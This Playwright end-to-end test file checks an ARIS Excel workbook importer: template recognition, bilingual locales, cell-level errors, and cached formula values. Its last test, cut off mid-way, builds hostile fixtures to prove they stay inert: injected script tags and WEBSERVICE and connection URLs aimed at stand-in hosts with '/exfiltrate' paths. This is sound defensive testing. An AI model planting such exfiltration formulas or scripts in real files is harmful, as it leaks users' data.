import { expect, test, type Locator, type Page } from '@playwright/test'
import { mkdtempSync, readFileSync, statSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

import { ARIS_EXCEL_LIMITS } from '../../src/aris/excel/limits'
import { parseArisWorkbook } from '../../src/aris/excel/workbookParser'
import {
  ARIS_SHEET_NAMES,
  ARIS_TEMPLATE_IDENTITY,
  type ArisSheetName
} from '../../src/aris/excel/templateSchema'
import { createArisTemplateWorkbook } from '../../src/aris/excel/templateWriter'
import {
  baselineFixtureSheets,
  buildFixtureWorkbook,
  buildRawWorksheetWorkbook,
  buildValidFixtureWorkbook,
  fixtureSheetXml,
  inflateDeclaredUncompressedSizes,
  withExtraZipEntry,
  type FixtureSheets
} from '../../src/aris/excel/testFixtures'
import { xmlEscape } from '../../src/aris/excel/xlsxWriter'
import { disableAutoTranslate } from './helpers/prefs'

// This file used to drive the retired BPMN-output spreadsheet-import pipeline
// (src/spreadsheet/**, `SpreadsheetImportPanel`): a free-form "ordinary
// workbook" column-mapping wizard, sequential-order flow inference, synthetic
// start/end boundary insertion, a folder-workspace multi-file `.bpmn` writer
// with destination-collision and rollback semantics, downloadable JSON import
// reports, reusable mapping presets, and RFC-4180 CSV input — all committing
// through `window.showDirectoryPicker`-mocked multi-file writes. Every one of
// those UI affordances was deleted with the BPMN shell (see the now-dead
// tests/e2e/lite-spreadsheet.spec.ts, which literally asserted "opens
// validated BPMN"). ArisApp.tsx never renders `SpreadsheetImportPanel`.
//
// ARIS ships its own, unrelated native Excel workbook layer instead (Phase 12,
// `src/aris/excel/**`, mounted as the "Excel" tab of `ArisGenerationPanel` —
// `data-orbitpm-aris-create-excel-tab`). It is a completely different feature,
// verified by reading `src/aris/excel/workbookParser.ts`,
// `src/aris/excel/xlsxReader.ts`, `src/aris/excel/templateSchema.ts`,
// `src/ArisGenerationPanel.tsx`, and `src/ArisApp.tsx`:
//
//   - Official-template-only. `parseArisWorkbook` step 3 REJECTS any workbook
//     that does not declare `OrbitPMArisTemplateVersion=1` (as a custom
//     document property or a visible A1 banner cell). There is no "ordinary
//     workbook" fallback and no column-mapping wizard of any kind — the nine
//     sheet names and their columns are fixed, and columns are matched by
//     normalized header NAME (case/space-insensitive), not position.
//   - `.xlsx` only. There is no CSV path anywhere in `src/aris/excel/**` (no
//     `csv` module, no CSV MIME handling) — grep confirms it.
//   - One atomic in-memory document. `ArisGenerationPanel.handleWorkbook`
//     parses the workbook, builds one AML document
//     (`buildAmlFromArisWorkbook`), and calls `onCreateModel` exactly once;
//     `ArisApp.handleCreateModel` opens it as a new source tab
//     (`openTab`/`upsertTab`, keyed by content hash). Nothing is ever written
//     to a folder/workspace destination for this flow, in any storage mode —
//     there is no multi-file write, hence no destination collision and no
//     "second artifact" to roll back.
//   - No cancel affordance. `parseArisWorkbookInBrowser`'s worker boundary
//     does support an `AbortSignal` (unit-tested in
//     `browserWorkbookParser.test.ts`), but `handleWorkbook` never creates an
//     `AbortController` or passes a signal, and the Excel tab's JSX branch
//     never renders `reviewAndSubmit` (the only place `data-orbitpm-aris-
//     create-cancel` exists) — there is no Cancel button reachable from the
//     UI for this flow.
//   - No downloadable report and no mapping presets. `onDownloadFile` is only
//     wired to the Excel templates and the AI §16.7 recovery artifact; there
//     is no import-report JSON and no preset export/import file input.
//   - Reused low-level security. `src/aris/excel/xlsxReader.ts` explicitly
//     reuses `src/spreadsheet/xlsxPreflight.ts` ("The secure ZIP preflight is
//     REUSED, never reimplemented") for ZIP-bomb/entry-count/encryption/
//     macro/traversal defenses, and `ARIS_EXCEL_LIMITS` is
//     unit-tested-parity-checked against the shared `SPREADSHEET_LIMITS`. So
//     oversize/encrypted/macro/malformed/decompression-bomb handling DOES
//     carry over, just surfaced through ARIS's own `ArisExcelIssue` codes.
//   - `buildAmlFromArisWorkbook` (src/aris/shell/arisExcelCreate.ts) reads
//     `workbook.models`, `.objects`, `.connections`, and `.attributes` only —
//     `.lanes`, `.freeText`, `.styles`, `.glossary`, and `.assignments` are
//     fully parsed and validated by the workbook parser but are NEVER
//     consumed when building the AML. Lanes, styles, free text, glossary, and
//     cross-model "assigned_model_id"/Assignments links therefore validate
//     cleanly on import but do not appear in the generated document. This is
//     a real, verified gap in the shipped generator (not a test limitation),
//     called out explicitly wherever it would otherwise be assumed to work.
//
// Boot pattern (BUILT dist single file, fallback storage, real AnimalWF
// reference import to reach the shell's 'ready' phase) follows the established
// precedent in tests/e2e/lite-providers.spec.ts and tests/e2e/aris-
// authoring.spec.ts, both already retargeted from the same dead BPMN boot.
//
// Four of the original fourteen tests have no surviving equivalent at all and
// are deleted below with a comment at the point they used to live, rather
// than kept as a hollowed-out shell: cancellation (no reachable Cancel
// control), destination-collision policy, second-artifact rollback (no
// multi-file writes occur), and mapping-preset export/reuse (no mapping step
// exists to have a preset for). The CSV RFC-4180 test is also deleted (no CSV
// input path exists). See the deletion comments for each, in their original
// numbered position, for the precise reasoning.

const HERE = dirname(fileURLToPath(import.meta.url))
const DIST = resolve(HERE, '../../dist/index.html')
const FILE_URL = pathToFileURL(DIST).toString()
const REFERENCE_AML = resolve(HERE, '../../../reference/AnimalWF/ARISAMLExport.xml')
const XLSX_MIME = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'

test.beforeAll(() => {
  const html = readFileSync(DIST, 'utf8')
  expect(html.length, 'dist/index.html should be a multi-hundred-KB single file').toBeGreaterThan(
    500_000
  )
  expect(statSync(REFERENCE_AML).isFile(), `reference fixture missing at ${REFERENCE_AML}`).toBe(
    true
  )
})

async function forceFallbackMode(page: Page): Promise<void> {
  await page.addInitScript(() => {
    localStorage.clear()
    Object.defineProperty(window, 'showDirectoryPicker', { configurable: true, value: undefined })
    Object.defineProperty(window, 'showOpenFilePicker', { configurable: true, value: undefined })
    Object.defineProperty(navigator, 'storage', { configurable: true, value: {} })
  })
}

/**
 * Boots the ARIS shell into 'ready' by importing the real reference export —
 * identical pattern to lite-providers.spec.ts / aris-authoring.spec.ts. There
 * is no "New blank diagram" entry point left; opening a real ARIS source is
 * how the shell reaches 'ready' now.
 */
async function openReferenceExport(page: Page): Promise<void> {
  await page.setViewportSize({ width: 1400, height: 900 })
  await forceFallbackMode(page)
  await disableAutoTranslate(page)
  await page.goto(FILE_URL, { waitUntil: 'load' })
  await page
    .getByRole('heading', { name: 'OrbitPM ARIS Studio Lite' })
    .waitFor({ state: 'visible' })
  await page.locator('input[type="file"]').first().setInputFiles(REFERENCE_AML)
  // The reference export parses 8 models; Playwright's default 5s expect
  // timeout is occasionally too tight for this under Firefox (observed
  // flaky across every spec sharing this exact boot pattern, including
  // pre-existing ones this task does not own) — widen it here explicitly.
  await expect(page.locator('[data-orbitpm-aris-model]')).toHaveCount(8, { timeout: 30_000 })
  await page
    .locator('[data-orbitpm-aris-canvas] [data-element-id^="ObjOcc."]')
    .first()
    .waitFor({ state: 'attached', timeout: 30_000 })
}

/** Boots to 'ready' and switches the Create panel to its Excel tab. */
async function openExcelTab(page: Page): Promise<Locator> {
  await openReferenceExport(page)
  const createPanel = page.locator('[data-orbitpm-aris-create]').first()
  await expect(createPanel).toBeVisible()
  await createPanel.locator('[data-orbitpm-aris-create-excel-tab]').click()
  return createPanel
}

async function uploadWorkbook(page: Page, bytes: Uint8Array, fileName: string): Promise<void> {
  await page.locator('input[accept=".xlsx"]').setInputFiles({
    name: fileName,
    mimeType: XLSX_MIME,
    buffer: Buffer.from(bytes)
  })
}

function excelIssueItems(panel: Locator): Locator {
  return panel.locator('[data-orbitpm-aris-excel-issues] li')
}

function excelStatus(panel: Locator): Locator {
  return panel.getByRole('status')
}

function visibleOccurrences(page: Page): Locator {
  return page.locator('[data-orbitpm-aris-canvas]:visible [data-element-id^="ObjOcc."]')
}

async function activeModelId(page: Page): Promise<string> {
  const id = await page
    .locator('[data-orbitpm-aris-model][aria-current="true"]')
    .getAttribute('data-orbitpm-aris-model')
  expect(id).not.toBeNull()
  return id as string
}

async function selectModel(page: Page, modelId: string): Promise<void> {
  await page.locator(`[data-orbitpm-aris-model="${modelId}"]`).click()
  await expect.poll(async () => activeModelId(page), { timeout: 30_000 }).toBe(modelId)
}

/**
 * Occurrences scoped to one model's own canvas layer — NOT a blind
 * `:visible` canvas-wide count. The canvas keeps one SVG layer per visited
 * model (aris-authoring.spec.ts's `occurrencesOf` uses the identical
 * scoping), so a global count would silently accumulate every model visited
 * so far in a multi-model tab instead of reporting the active model alone.
 */
function occurrencesOfModel(page: Page, modelId: string): Locator {
  return page
    .locator(`[data-orbitpm-aris-canvas] g[data-element-id="model:${modelId}"]`)
    .locator('g.djs-element[data-element-id^="ObjOcc."]')
}

/** The tabpanel of the currently active source tab (others carry `hidden`). */
function activeTabPanel(page: Page): Locator {
  return page.locator('[role="tabpanel"]:not([hidden])')
}

/**
 * Downloads the EXACT generated AML bytes of the active tab ("Download exact
 * source" — `downloadBytes(tab.bytes)` in ArisApp.tsx, a plain blob download
 * with no diffing). Deliberately not the "Experimental ARIS AML export"
 * button (`data-orbitpm-aris-export-derived`): that one runs the byte-diff
 * exporter built for editing an IMPORTED source (`arisDerivedExport.ts`) and
 * refuses a freshly-generated, never-imported document — confirmed by
 * running this suite, where it left the click pending with no download and
 * would have surfaced an "export was refused" toast. The exact-source
 * download has no such precondition and is the right tool to inspect what
 * the Excel pipeline actually generated.
 */
async function downloadExactSource(page: Page): Promise<string> {
  const downloadPromise = page.waitForEvent('download')
  await activeTabPanel(page)
    .getByRole('button', { name: 'Download exact source', exact: true })
    .click()
  const download = await downloadPromise
  const saved = join(mkdtempSync(join(tmpdir(), 'orbitpm-aris-excel-')), 'exact-source.xml')
  await download.saveAs(saved)
  return readFileSync(saved, 'utf8')
}

// ---------------------------------------------------------------------------
// X1 (x3): official templates in three language-coverage variants.
//
// ARIS's schema requires `name_en` on every Models/Objects/Lanes/FreeText row
// (`valueRequired: true` in templateSchema.ts) and makes `name_ar` optional —
// so, unlike the retired BPMN template, a workbook cannot legally carry
// Arabic-only content. The three real, legally-distinct states the schema
// allows are: English-only (no `name_ar`/`description_ar`/Arabic attributes
// anywhere), Arabic-primary (every optional Arabic column populated with
// substantive text, English kept to the required minimum), and bilingual
// (both populated). Each case verifies the workbook is accepted with zero
// issues, that `buildAmlFromArisWorkbook` places the AI... no AI at all here,
// no key, and that the produced AML carries exactly the expected AttrValue
// LocaleId set (1033 = EN, 1025 = AR — `EN_LOCALE_ID`/`AR_LOCALE_ID` in
// arisExcelCreate.ts), read back through the same derived-AML-export download
// aris-authoring.spec.ts already proves works.
// ---------------------------------------------------------------------------

interface LanguageCase {
  readonly title: string
  readonly fileBase: string
  readonly workbook: () => Uint8Array
  readonly expectEn: boolean
  readonly expectAr: boolean
  readonly arabicNeedle?: string
}

const LANGUAGE_CASES: readonly LanguageCase[] = [
  {
    title: 'official English-only workbook',
    fileBase: 'mandatory-english-only',
    workbook: () =>
      buildValidFixtureWorkbook({
        Models: [
          {
            model_id: 'MDL_1',
            model_type: 'MT_EEPC',
            name_en: 'English only model',
            orientation: 'horizontal'
          }
        ],
        Objects: [
          {
            model_id: 'MDL_1',
            object_id: 'OBJ_EVT',
            occurrence_id: 'OCC_EVT',
            object_type: 'OT_EVT',
            symbol_type: 'ST_EV',
            name_en: 'Request received'
          },
          {
            model_id: 'MDL_1',
            object_id: 'OBJ_FUNC',
            occurrence_id: 'OCC_FUNC',
            object_type: 'OT_FUNC',
            symbol_type: 'ST_FUNC',
            name_en: 'Handle request'
          }
        ]
      }),
    expectEn: true,
    expectAr: false
  },
  {
    title: 'official Arabic-primary workbook',
    fileBase: 'mandatory-arabic-primary',
    workbook: () =>
      buildValidFixtureWorkbook({
        Models: [
          {
            model_id: 'MDL_1',
            model_type: 'MT_EEPC',
            name_en: 'Arabic primary model',
            name_ar: 'نموذج أساسه العربية بالكامل',
            orientation: 'horizontal'
          }
        ],
        Attributes: [
          {
            owner_kind: 'model',
            owner_id: 'MDL_1',
            attribute_type: 'AT_DESC',
            language: 'ar',
            value: 'وصف كامل بالعربية لهذا النموذج التجريبي.',
            value_type: 'text'
          }
        ]
      }),
    expectEn: true,
    expectAr: true,
    arabicNeedle: 'وصف كامل بالعربية لهذا النموذج التجريبي.'
  },
  {
    title: 'official bilingual workbook',
    fileBase: 'mandatory-bilingual',
    // The baseline fixture is already bilingual on every row: no overrides.
    workbook: () => buildValidFixtureWorkbook(),
    expectEn: true,
    expectAr: true,
    arabicNeedle: 'نموذج أساسي'
  }
]

for (const languageCase of LANGUAGE_CASES) {
  test(`mandatory spreadsheet X1: ${languageCase.title} imports through the real ARIS Excel worker and carries the expected AttrValue locales`, async ({
    page
  }) => {
    const panel = await openExcelTab(page)
    await uploadWorkbook(page, languageCase.workbook(), `${languageCase.fileBase}.xlsx`)

    await expect(excelIssueItems(panel)).toHaveCount(0)
    await expect(excelStatus(panel)).toHaveText('Created 1 models, 2 objects, 1 connections.', {
      timeout: 30_000
    })

    const tab = page.getByRole('tab', { name: languageCase.fileBase, exact: true })
    await expect(tab).toHaveAttribute('aria-selected', 'true')
    await expect(visibleOccurrences(page)).toHaveCount(2)

    const derived = await downloadExactSource(page)
    expect(derived).toContain('LocaleId="1033"')
    if (languageCase.expectAr) {
      expect(derived).toContain('LocaleId="1025"')
    } else {
      expect(derived).not.toContain('LocaleId="1025"')
    }
    if (languageCase.arabicNeedle) {
      expect(derived).toContain(languageCase.arabicNeedle)
    }
  })
}

// ---------------------------------------------------------------------------
// Retargeted X1/X5/X10. The original test drove a free-form column-mapping
// wizard (worksheet/header-row pickers, per-field confidence-scored dropdown
// mapping, value remapping, delimiter configuration, numeric-order flow
// inference, synthetic start/end boundary insertion) that has no ARIS
// equivalent whatsoever — `parseArisWorkbook` recognizes exactly nine fixed
// sheets by fixed column names and REJECTS anything that does not declare the
// official template identity (`template-version-missing`, tested directly in
// workbookParser.test.ts). There is no "ordinary workbook" fallback path to
// exercise. What IS real and worth proving instead: the identity check
// itself, and that a workbook is recognized by EITHER of its two independent
// pieces of evidence (the machine-readable custom document property, or the
// human-visible A1 banner cell alone) — i.e. header/column NAMES drive
// recognition, not a rigid byte-for-byte template match. XLS-02's "ordinary
// single-sheet mapping" has no surviving equivalent (see the report).
// ---------------------------------------------------------------------------

test('mandatory spreadsheet: an ARIS workbook is recognized by its custom template property or its visible banner cell, and is rejected outright with no identity evidence at all', async ({
  page
}) => {
  const panel = await openExcelTab(page)

  // No identity evidence anywhere: rejected before any mapping is attempted.
  const stripped = buildFixtureWorkbook({
    sheets: baselineFixtureSheets(),
    customProperties: [],
    banner: false
  })
  await uploadWorkbook(page, stripped, 'mandatory-unmarked.xlsx')
  await expect(excelStatus(panel)).toContainText('The workbook was rejected', { timeout: 30_000 })
  await expect(
    excelIssueItems(panel).filter({
      hasText: 'does not declare an ARIS workbook template version'
    })
  ).toHaveCount(1)
  const tabsAfterRejection = await page.getByRole('tab').count()

  // The visible banner cell ALONE (no custom document property) is still
  // sufficient evidence — a workbook re-saved by a tool that stripped custom
  // properties but kept the human-readable A1 text is still recognized.
  const bannerOnly = buildFixtureWorkbook({
    sheets: baselineFixtureSheets(),
    customProperties: [],
    banner: true
  })
  await uploadWorkbook(page, bannerOnly, 'mandatory-banner-only.xlsx')
  await expect(excelIssueItems(panel)).toHaveCount(0)
  await expect(excelStatus(panel)).toHaveText('Created 1 models, 2 objects, 1 connections.', {
    timeout: 30_000
  })
  expect(await page.getByRole('tab').count()).toBe(tabsAfterRejection + 1)
})

// ---------------------------------------------------------------------------
// Retargeted X3/X10. The original asserted BPMN-specific output shape
// (folders, pools, lanes, gateway defaults, linked call activities) written
// as multiple `.bpmn` files into a mocked folder workspace. The real ARIS
// equivalent, verified by reading arisExcelCreate.ts, is: several models
// committed into ONE AML document (not files — folders/pools have no ARIS
// workbook analog), an EPC XOR rule object (the ARIS "gateway" equivalent),
// and bilingual object/model names. This uses the product's OWN official
// example template (`createArisTemplateWorkbook('example')` — exactly what
// the "Download example template" button produces, already proven to
// round-trip in aris-authoring.spec.ts) rather than a hand-built fixture, for
// the strongest possible grounding. Its exact shape (3 models, 11 object
// occurrences, 8 connections, an XOR rule in MDL_LEAVE) is independently
// unit-tested in workbookParser.test.ts's "reports display counts" test.
//
// Lanes, free text, styles, glossary, and the Assignments-sheet cross-model
// links ("calls") are present and valid in this same template, but
// `buildAmlFromArisWorkbook` never reads `workbook.lanes` / `.freeText` /
// `.styles` / `.glossary` / `.assignments` — verified by grep. They validate
// on import but are silently absent from the generated AML. That is asserted
// below as a real, current limitation, not glossed over.
// ---------------------------------------------------------------------------

test('mandatory spreadsheet X3/X10: the official example workbook commits every model and its EPC rule object, while lane/style/glossary/assignment data is parsed but not yet reflected in the generated document', async ({
  page
}) => {
  const panel = await openExcelTab(page)
  await uploadWorkbook(page, createArisTemplateWorkbook('example'), 'mandatory-complex.xlsx')

  await expect(excelIssueItems(panel)).toHaveCount(0)
  await expect(excelStatus(panel)).toHaveText('Created 3 models, 11 objects, 8 connections.', {
    timeout: 60_000
  })

  const tab = page.getByRole('tab', { name: 'mandatory-complex', exact: true })
  await expect(tab).toHaveAttribute('aria-selected', 'true')

  // `buildAmlFromArisWorkbook` (arisExcelCreate.ts) writes each Model.ID as
  // `Model.<workbook model_id>` (`arisIdForWorkbookId('Model', modelId)`), and
  // the studio model explorer keys off that AML-declared id verbatim, not the
  // bare workbook id.
  const modelButtons = page.locator('[data-orbitpm-aris-model]')
  await expect(modelButtons).toHaveCount(3)
  const modelIds = await modelButtons.evaluateAll((nodes) =>
    nodes.map((node) => node.getAttribute('data-orbitpm-aris-model') ?? '')
  )
  expect(new Set(modelIds)).toEqual(
    new Set(['Model.MDL_LEAVE', 'Model.MDL_CHAIN', 'Model.MDL_DETAIL'])
  )

  const occurrencesPerModel: Record<string, number> = {
    'Model.MDL_LEAVE': 6,
    'Model.MDL_CHAIN': 2,
    'Model.MDL_DETAIL': 3
  }
  for (const modelId of Object.keys(occurrencesPerModel)) {
    await selectModel(page, modelId)
    await expect
      .poll(async () => occurrencesOfModel(page, modelId).count(), { timeout: 30_000 })
      .toBe(occurrencesPerModel[modelId]!)
  }

  // The XOR rule object (the EPC "gateway" equivalent) rendered as a real
  // occurrence in MDL_LEAVE.
  await selectModel(page, 'Model.MDL_LEAVE')
  await expect(
    page.locator(
      '[data-orbitpm-aris-canvas] g[data-element-id="model:Model.MDL_LEAVE"] [data-element-id="ObjOcc.OCC_RULE_DECISION"]'
    )
  ).toBeVisible()

  // Bilingual model/object names committed (via the Attributes/name_ar path).
  const derived = await downloadExactSource(page)
  expect(derived).toContain('Leave approval')
  expect(derived).toContain('الموافقة على الإجازة')

  // Real, current limitation: Lanes/Styles/Glossary/Assignments are valid and
  // parsed (the workbook was accepted with zero issues, above) but never
  // reach the writer — confirmed both by reading arisExcelCreate.ts (no
  // reference to `workbook.lanes` anywhere) and here: neither lane id ever
  // appears in the generated document.
  expect(derived).not.toContain('LANE_EMPLOYEE')
  expect(derived).not.toContain('LANE_MANAGER')
})

// ---------------------------------------------------------------------------
// X5 retargeted: the same "row-level error matrix, worksheet+cell evidence"
// intent, reshaped onto ARIS's real per-cell issue codes. "Circular lanes"
// has no ARIS analog (the Lanes sheet has no parent/hierarchy column — flat
// lanes only) and "invalid defaults" has no analog (ARIS connections carry no
// `is_default` flag) — both are replaced with two other real, cell-addressed
// diagnostics from the same module: invalid-symbol-type and
// invalid-connection-type. Recoverable problems are accepted and rendered in
// that same list; unrecoverable problems still reject the workbook. Note: the
// Excel tab's issue list renders
// `${sheet}!${cell} — ${message}` (see `issueLine` in ArisGenerationPanel.tsx)
// without a severity marker or the offending raw value, unlike the retired
// panel's "Raw value / Normalized value" rows. Severity and raw value ARE
// carried on `ArisExcelIssue`, so accepted cases assert warning severity from
// the parser and assert the same worksheet+cell evidence remains surfaced in
// the UI.
// ---------------------------------------------------------------------------

test('mandatory spreadsheet X5: row-level errors preserve worksheet and cell evidence for missing values, duplicate ids, broken references, and unknown/invalid types', async ({
  page
}) => {
  const baseline = baselineFixtureSheets()
  const cases: readonly {
    readonly name: string
    readonly overrides: FixtureSheets
    readonly sheet: ArisSheetName
    readonly messageFragment: string
    readonly expectedOutcome: 'rejected' | 'accepted-with-warning'
    readonly warningCode?: 'missing-reference' | 'invalid-symbol-type'
    readonly warningAction?: 'connection-skipped'
  }[] = [
    {
      name: 'missing required value',
      overrides: {
        Objects: [
          ...(baseline.Objects ?? []),
          {
            model_id: 'MDL_1',
            object_id: 'OBJ_MISSING_NAME',
            occurrence_id: 'OCC_MISSING_NAME',
            object_type: 'OT_FUNC',
            symbol_type: 'ST_FUNC',
            name_en: ''
          }
        ]
      },
      sheet: 'Objects',
      messageFragment: 'required cell value is empty',
      expectedOutcome: 'rejected'
    },
    {
      name: 'duplicate id',
      overrides: {
        Models: [
          { model_id: 'MDL_1', model_type: 'MT_EEPC', name_en: 'First' },
          { model_id: 'MDL_1', model_type: 'MT_EEPC', name_en: 'Second' }
        ]
      },
      sheet: 'Models',
      messageFragment: 'more than one row declares the same identifier',
      expectedOutcome: 'rejected'
    },
    {
      name: 'broken reference',
      overrides: {
        Connections: [
          ...(baseline.Connections ?? []),
          {
            model_id: 'MDL_1',
            connection_id: 'CXN_BROKEN',
            source_occurrence_id: 'OCC_FUNC',
            target_occurrence_id: 'OCC_MISSING',
            connection_type: 'CT_ACT_1'
          }
        ]
      },
      sheet: 'Connections',
      messageFragment: 'references an identifier that does not exist',
      expectedOutcome: 'accepted-with-warning',
      warningCode: 'missing-reference',
      warningAction: 'connection-skipped'
    },
    {
      name: 'unknown object type',
      overrides: {
        Objects: [
          ...(baseline.Objects ?? []),
          {
            model_id: 'MDL_1',
            object_id: 'OBJ_UNKNOWN_TYPE',
            occurrence_id: 'OCC_UNKNOWN_TYPE',
            object_type: 'OT_MADE_UP',
            symbol_type: 'ST_FUNC',
            name_en: 'Unrecognized'
          }
        ]
      },
      sheet: 'Objects',
      messageFragment: 'object type this build does not recognize',
      expectedOutcome: 'rejected'
    },
    {
      name: 'invalid symbol type',
      overrides: {
        Objects: [
          ...(baseline.Objects ?? []),
          {
            model_id: 'MDL_1',
            object_id: 'OBJ_BAD_SYMBOL',
            occurrence_id: 'OCC_BAD_SYMBOL',
            object_type: 'OT_FUNC',
            symbol_type: 'rectangle',
            name_en: 'Malformed symbol'
          }
        ]
      },
      sheet: 'Objects',
      messageFragment: 'symbol type does not match its object type',
      expectedOutcome: 'accepted-with-warning',
      warningCode: 'invalid-symbol-type'
    },
    {
      name: 'invalid connection type',
      overrides: {
        Connections: [
          ...(baseline.Connections ?? []),
          {
            model_id: 'MDL_1',
            connection_id: 'CXN_BAD_TYPE',
            source_occurrence_id: 'OCC_EVT',
            target_occurrence_id: 'OCC_FUNC',
            connection_type: 'sequenceFlow'
          }
        ]
      },
      sheet: 'Connections',
      messageFragment: 'connection type this build does not recognize',
      expectedOutcome: 'rejected'
    }
  ]

  const panel = await openExcelTab(page)
  const tabsBefore = await page.getByRole('tab').count()
  for (const [index, scenario] of cases.entries()) {
    await test.step(scenario.name, async () => {
      const workbook = buildValidFixtureWorkbook(scenario.overrides)
      const fileName = `mandatory-${index}-${scenario.name.replace(/\s+/g, '-')}.xlsx`
      await uploadWorkbook(page, workbook, fileName)
      if (scenario.expectedOutcome === 'rejected') {
        await expect(excelStatus(panel)).toContainText('The workbook was rejected', {
          timeout: 30_000
        })
      } else {
        const parsed = parseArisWorkbook(fileName, workbook)
        expect(parsed.status).toBe('accepted')
        const warning = parsed.issues.filter(({ code }) => code === scenario.warningCode)
        expect(warning).toHaveLength(1)
        expect(warning[0]).toMatchObject({
          severity: 'warning',
          sheet: scenario.sheet,
          cell: expect.stringMatching(/^[A-Z]+\d+$/),
          ...(scenario.warningAction
            ? { details: expect.objectContaining({ action: scenario.warningAction }) }
            : {})
        })
        await expect(excelStatus(panel)).toContainText(/^Created 1 models,/, {
          timeout: 30_000
        })
      }
      const issue = excelIssueItems(panel).filter({ hasText: scenario.messageFragment })
      await expect(issue).toHaveCount(1)
      await expect(issue).toContainText(`${scenario.sheet}!`)
    })
  }
  const acceptedCaseCount = cases.filter(
    ({ expectedOutcome }) => expectedOutcome === 'accepted-with-warning'
  ).length
  expect(await page.getByRole('tab').count()).toBe(tabsBefore + acceptedCaseCount)
})

// ---------------------------------------------------------------------------
// X6 DELETED: "RFC-4180 quoted multiline Arabic CSV survives worker parsing,
// XML generation, and visible language projection." There is no CSV input
// path in the ARIS Excel pipeline at all — `src/aris/excel/**` has no `csv`
// module (confirmed by grep), `parseArisWorkbook`'s step 1 rejects any
// filename whose extension is not `xlsx`, and `ArisGenerationPanel`'s Excel
// tab file input is `accept=".xlsx"` only. CSV support existed exclusively in
// the retired BPMN pipeline (`src/spreadsheet/csv.ts`), which nothing in the
// ARIS shell calls. GAP: XLS-06 has no surviving equivalent.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// X7 retargeted: formula cells with and without a cached value. This is real,
// unchanged infrastructure — `readArisXlsx` in xlsxReader.ts never evaluates
// a formula; it reads Excel's own cached `<v>` and rejects a formula cell
// that has none (`formula-without-cached-value`, error) while accepting one
// that does with a `cached-formula-value` warning (unit-tested exactly this
// way in workbookParser.test.ts's "formulas are never executed" suite).
// ---------------------------------------------------------------------------

function inlineCell(reference: string, value: string): string {
  return `<c r="${reference}" t="inlineStr"><is><t>${xmlEscape(value)}</t></is></c>`
}

function formulaCell(reference: string, formula: string, cached?: string): string {
  const value = cached === undefined ? '' : `<v>${xmlEscape(cached)}</v>`
  return `<c r="${reference}" t="str"><f>${xmlEscape(formula)}</f>${value}</c>`
}

function modelsWorksheetXmlWithFormula(nameCell: string): string {
  const headers = [
    'model_id',
    'model_type',
    'name_en',
    'name_ar',
    'process_code',
    'description_en',
    'description_ar',
    'orientation'
  ]
  return (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>' +
    `<row r="1">${inlineCell('A1', ARIS_TEMPLATE_IDENTITY)}</row>` +
    `<row r="2">${headers
      .map((header, index) => inlineCell(`${String.fromCharCode(65 + index)}2`, header))
      .join('')}</row>` +
    `<row r="3">${inlineCell('A3', 'MDL_1')}${inlineCell('B3', 'MT_EEPC')}${nameCell}</row>` +
    '</sheetData></worksheet>'
  )
}

function workbookWithFormulaModelName(modelsXml: string): Uint8Array {
  const baseline = baselineFixtureSheets()
  return buildRawWorksheetWorkbook(
    ARIS_SHEET_NAMES.map((name: ArisSheetName) => ({
      name,
      xml: name === 'Models' ? modelsXml : fixtureSheetXml(name, baseline[name] ?? [])
    }))
  )
}

test('mandatory spreadsheet X7: formula cells with and without cached displayed values are distinguished by the real worker', async ({
  page
}) => {
  const networkRequests: string[] = []
  page.on('request', (request) => {
    if (/^https?:/i.test(request.url())) networkRequests.push(request.url())
  })
  const panel = await openExcelTab(page)
  // The Excel-created tab is sourceKind 'generated', which auto-translates its
  // missing language via the free chain by default. Opt out so the zero-network
  // assertion isolates the spreadsheet worker (getPref reads localStorage live).
  await page.evaluate(() => localStorage.setItem('orbitpm.lite.cfg.arisAutoTranslate', 'off'))

  await test.step('cached formula value is used and the formula stays inert', async () => {
    const bytes = workbookWithFormulaModelName(
      modelsWorksheetXmlWithFormula(
        formulaCell('C3', 'CONCATENATE("Leave"," approval")', 'Leave approval')
      )
    )
    await uploadWorkbook(page, bytes, 'mandatory-formula-cached.xlsx')
    const issue = excelIssueItems(panel).filter({
      hasText: 'read using its cached value instead of evaluating the formula'
    })
    await expect(issue).toHaveCount(1)
    await expect(issue).toContainText('Models!C3')
    await expect(excelStatus(panel)).toHaveText('Created 1 models, 2 objects, 1 connections.', {
      timeout: 30_000
    })
    const derived = await downloadExactSource(page)
    expect(derived).toContain('Leave approval')
    expect(derived).not.toContain('CONCATENATE')
  })

  await test.step('a formula with no cached value is rejected before any mapping', async () => {
    const bytes = workbookWithFormulaModelName(
      modelsWorksheetXmlWithFormula(formulaCell('C3', 'RAND()'))
    )
    await uploadWorkbook(page, bytes, 'mandatory-formula-missing-cache.xlsx')
    const issue = excelIssueItems(panel).filter({
      hasText: 'formula cell has no cached value to read'
    })
    await expect(issue).toHaveCount(1)
    await expect(issue).toContainText('Models!C3')
    await expect(excelStatus(panel)).toHaveText(
      'The workbook was rejected: 1 errors, 0 warnings.',
      {
        timeout: 30_000
      }
    )
  })

  expect(networkRequests).toEqual([])
})

// ---------------------------------------------------------------------------
// X7/X8 retargeted: external links and data connections are inert, ignored,
// and reported — through the reused preflight's `external-links-ignored` /
// `data-connections-ignored` warnings (xlsxPreflight.ts). These are the same
// warnings XLSX import always carried; ARIS maps them onto its own issue
// codes (xlsxReader.ts's `preflight.warnings.map(...)`) rather than
// reimplementing the detection.
// ---------------------------------------------------------------------------

test('mandatory spreadsheet X7/X8: external links and data connections are inert, ignored, and reported without network activity', async ({
  page
}) => {
  await page.addInitScript(() => {
    ;(
      window as unknown as { __ARIS_EXCEL_EXTERNAL_EXECUTED__: boolean }
    ).__ARIS_EXCEL_EXTERNAL_EXECUTED__ = false
  })
  const networkRequests: string[] = []
  page.on('request', (request) => {
    if (/^https?:/i.test(request.url())) networkRequests.push(request.url())
  })

  const externalPayload =
    '<externalLink><script>window.__ARIS_EXCEL_EXTERNAL_EXECUTED__=true</script>' +
    '<formula>WEBSERVICE("https://external.invalid/exfiltrate")</formula></externalLink>'
  const connectionsPayload =
    '<connections><connection name="danger"><script>window.__ARIS_EXCEL_EXTERNAL_EXECUTED__=true</script>' +
    '<url>https://connections.invalid/exfiltrate</url></connection></connections>'

